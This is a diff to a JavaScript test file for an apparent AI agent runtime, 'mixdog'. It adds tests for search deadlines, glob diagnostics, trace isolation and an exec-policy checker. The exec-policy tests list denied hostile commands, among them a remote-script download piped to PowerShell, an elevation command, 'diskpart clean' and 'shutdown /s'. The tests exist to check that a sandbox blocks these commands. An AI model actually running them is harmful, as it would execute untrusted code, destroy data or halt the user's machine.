@@ -43,6 +43,7 @@ import {
   _bindNativeSearchServerLifecycle,
   _ackNativeSearchCancellationForTest,
   _requestNativeForTest,
+  _softDeadlineMsForTest,
 } from '../src/runtime/agent/orchestrator/tools/builtin/native-search-client.mjs';
 import { _runReadOnlyIoWithDeadlineForTest } from '../src/runtime/agent/orchestrator/session/loop/tool-exec.mjs';
 import {
@@ -63,6 +64,7 @@ import {
   ensureTokenAddon,
   findCachedTokenAddon,
 } from '../src/runtime/agent/orchestrator/tools/token-addon-fetcher.mjs';
+import { executeGlobTool } from '../src/runtime/agent/orchestrator/tools/builtin/search-tool.mjs';
 
 // ==== from shell-hardening-test.mjs ====
 // Regression + integration tests for three recent shell hardening changes:
@@ -248,6 +250,12 @@ test('native search cancellation acknowledgement disarms forced recycle', async 
         if (previous === undefined) delete process.env.MIXDOG_SEARCH_CANCEL_GRACE_MS;
         else process.env.MIXDOG_SEARCH_CANCEL_GRACE_MS = previous;
     }
+});
+
+test('native search soft deadline reserves response-processing grace', () => {
+    assert.equal(_softDeadlineMsForTest(20_000), 18_500);
+    assert.equal(_softDeadlineMsForTest(10_000), 9_250);
+    assert.equal(_softDeadlineMsForTest(100), 1);
 });
 
 test('read-only I/O tools share one hard deadline and receive cancellation', async () => {
@@ -621,6 +629,8 @@ test('D: exec policy allows normal pipes, redirects, and quoted regex literals',
         "$rows | Where-Object { $_.error -match 'powershell|bash|grep|tail' } | ConvertTo-Json",
         'node -e "console.log(\'powershell|bash|grep\')"',
         'Write-Output "Invoke-Expression"; Write-Output "Start-Process -Verb RunAs"',
+        'Write-Output "shutdown"; Write-Output "reboot"',
+        'node -e "console.log(\'shutdown\')"',
     ];
     for (const cmd of allowed) {
         assert.equal(checkExecPolicyMessage(cmd), null, `expected exec policy allow: ${cmd}`);
@@ -634,9 +644,27 @@ test('D: exec policy still blocks remote execution, elevation, and destructive s
         'iwr https://example.invalid/x.ps1 | powershell',
         'Start-Process powershell -Verb RunAs',
         'diskpart clean',
+        'shutdown /s',
+        'powershell -Command "shutdown /s"',
     ];
     for (const cmd of denied) {
         assert.match(checkExecPolicyMessage(cmd) || '', /blocked by exec policy/, `expected exec policy deny: ${cmd}`);
+    }
+});
+
+test('glob empty-result diagnostics reuse settled stat records', async () => {
+    const dir = mkdtempSync(join(tmpdir(), 'mixdog-empty-glob-'));
+    try {
+        const result = await executeGlobTool({
+            pattern: '**/*.definitely-missing',
+            path: dir,
+            head_limit: 10,
+            offset: 0,
+        }, process.cwd());
+        assert.match(result, /\(no files found\)/);
+        assert.match(result, /path exists \(dir\)/);
+    } finally {
+        rmSync(dir, { recursive: true, force: true });
     }
 });
 
@@ -1157,6 +1185,89 @@ test('session cancellations remain traceable without entering tool-failures.json
       failureLogExists: false,
       category: 'expected-cancellation',
     });
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test('implicit test traces are isolated while ship failures remain queryable', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'mixdog-trace-isolation-'));
+  try {
+    const traceScript = `
+      import { existsSync } from 'node:fs';
+      import { join } from 'node:path';
+      import { traceAgentTool } from './src/runtime/agent/orchestrator/agent-trace-format.mjs';
+      import { drainAgentTrace } from './src/runtime/agent/orchestrator/agent-trace-io.mjs';
+      traceAgentTool({
+        sessionId: 'test-isolation',
+        iteration: 1,
+        toolName: 'read',
+        toolKind: 'builtin',
+        toolMs: 1,
+        resultKind: 'normal',
+        resultText: 'ok',
+      });
+      await drainAgentTrace();
+      process.stdout.write(JSON.stringify({
+        trace: existsSync(join(process.env.MIXDOG_DATA_DIR, 'history', 'agent-trace.jsonl')),
+        failures: existsSync(join(process.env.MIXDOG_DATA_DIR, 'history', 'tool-failures.jsonl')),
+      }));
+    `;
+    const isolated = spawnSync(process.execPath, ['--input-type=module', '-e', traceScript], {
+      cwd: process.cwd(),
+      encoding: 'utf8',
+      env: {
+        ...process.env,
+        MIXDOG_DATA_DIR: dir,
+        MIXDOG_MODE: 'dev',
+        MIXDOG_DIAGNOSTICS: '1',
+        MIXDOG_AGENT_TRACE_PATH: '',
+        MIXDOG_TOOL_FAILURE_LOG_PATH: '',
+        MIXDOG_AGENT_TRACE_DISABLE: '',
+        NODE_TEST_CONTEXT: '1',
+        MIXDOG_RUNTIME_ROOT: join(dir, 'no-service'),
+      },
+    });
+    assert.equal(isolated.status, 0, isolated.stderr);
+    assert.deepEqual(JSON.parse(isolated.stdout), { trace: false, failures: false });
+
+    const failureScript = `
+      import { existsSync } from 'node:fs';
+      import { join } from 'node:path';
+      import { traceAgentTool } from './src/runtime/agent/orchestrator/agent-trace-format.mjs';
+      traceAgentTool({
+        sessionId: 'ship-failure',
+        iteration: 1,
+        toolName: 'read',
+        toolKind: 'builtin',
+        toolMs: 1,
+        resultKind: 'error',
+        resultText: 'Error: production failure probe',
+      });
+      await new Promise((resolve) => setTimeout(resolve, 1200));
+      process.stdout.write(JSON.stringify({
+        trace: existsSync(join(process.env.MIXDOG_DATA_DIR, 'history', 'agent-trace.jsonl')),
+        failures: existsSync(join(process.env.MIXDOG_DATA_DIR, 'history', 'tool-failures.jsonl')),
+      }));
+    `;
+    const shipped = spawnSync(process.execPath, ['--input-type=module', '-e', failureScript], {
+      cwd: process.cwd(),
+      encoding: 'utf8',
+      env: {
+        ...process.env,
+        MIXDOG_DATA_DIR: dir,
+        MIXDOG_MODE: 'ship',
+        MIXDOG_DIAGNOSTICS: '',
+        MIXDOG_AGENT_TRACE_PATH: '',
+        MIXDOG_TOOL_FAILURE_LOG_PATH: '',
+        MIXDOG_AGENT_TRACE_DISABLE: '',
+        MIXDOG_TOOL_FAILURE_LOG_DISABLE: '',
+        NODE_TEST_CONTEXT: '',
+        MIXDOG_RUNTIME_ROOT: join(dir, 'no-service'),
+      },
+    });
+    assert.equal(shipped.status, 0, shipped.stderr);
+    assert.deepEqual(JSON.parse(shipped.stdout), { trace: false, failures: true });
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
